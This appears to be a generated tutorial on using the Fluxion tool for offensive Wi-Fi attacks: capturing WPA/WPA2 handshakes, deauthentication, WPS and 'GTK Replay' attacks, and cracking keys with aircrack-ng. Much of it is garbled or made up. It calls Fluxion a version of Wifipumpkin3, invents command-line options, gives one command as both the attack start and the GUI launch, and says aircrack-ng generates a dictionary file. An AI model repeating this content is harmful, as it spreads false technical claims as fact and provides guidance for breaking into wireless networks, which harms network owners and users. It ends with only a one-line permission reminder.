 Fluxion is a full-featured, modular, lightweight, and portable version of Wifipumpkin3 for offensive wireless operations. It offers various features to perform different types of attacks on Wi-Fi networks. Below are some key features of Fluxion along with examples that you can run in the Kali Linux terminal:

### 1. **Basic Usage**
Fluxion provides a command-line interface (CLI) for executing its suite of wireless network attack modules. Here’s how to use it:

```bash
sudo fluxion
```
This will start Fluxion with its graphical user interface (GUI). If you prefer the CLI, you can run:

```bash
sudo ./fluxion -i eth0 -k wlp2s0 -c 1 -n targetssid
```
Here’s what each option means:
- `-i`: Interface to use for the attack. Replace `eth0` with your network interface (e.g., wlan0).
- `-k`: Wireless interface to use. Replace `wlp2s0` with your wireless interface.
- `-c`: Channel to target. You can specify a channel number where the target SSID is available.
- `-n`: Specify the target SSID.

### 2. **Starting the Attack**
To start the attack, use:

```bash
sudo fluxion -u
```
This will initiate the attack and attempt to capture the handshake necessary for cracking WPA/WPA2 passwords.

### 3. **Targeting Specific SSIDs**
If you know the target SSID, you can specify it directly in the command:

```bash
sudo ./fluxion -i eth0 -k wlp2s0 -c 1 -n "targetssid"
```
Here, replace `targetssid` with the actual SSID of your target network.

### 4. **Available Modules**
Fluxion supports various modules for different types of attacks:
- **Deauth Attack**: To perform a deauthentication attack on a client connected to the target network:
  ```bash
  sudo fluxion -i eth0 -k wlp2s0 -c 1 -n "targetssid" --attack wps --method deauth
  ```
- **WPS Attack**: To use WPS (WiFi Protected Setup) attack to crack WPA/WPA2:
  ```bash
  sudo fluxion -i eth0 -k wlp2s0 -c 1 -n "targetssid" --attack wps
  ```
- **GTK Replay Attack**: To perform a GTK Replay attack:
  ```bash
  sudo fluxion -i eth0 -k wlp2s0 -c 1 -n "targetssid" --attack wps --method gtkrepeater
  ```

### 5. **Customization**
You can customize various aspects of the attack, such as delay and verbosity:
- To increase the delay between steps in the attack:
  ```bash
  sudo ./fluxion -i eth0 -k wlp2s0 -c 1 -n "targetssid" --delay 5
  ```
- To run Fluxion with more verbose output:
  ```bash
  sudo ./fluxion -i eth0 -k wlp2s0 -c 1 -n "targetssid" --verbose
  ```

### 6. **Post-Attack Actions**
After capturing the handshake, you might want to use tools like `aircrack-ng` to crack the WPA/WPA2 key:
```bash
sudo aircrack-ng yourfile.cap
```
This will generate a dictionary file for cracking.

### 7. **GUI Mode**
If you prefer a graphical interface, simply run:
```bash
sudo fluxion -u
```
The GUI will appear and guide you through the attack process.

### Conclusion
Fluxion provides a powerful set of tools for wireless network attacks, and understanding its command-line usage can be beneficial for advanced users. Always ensure you have permission to perform these actions on any network you target.

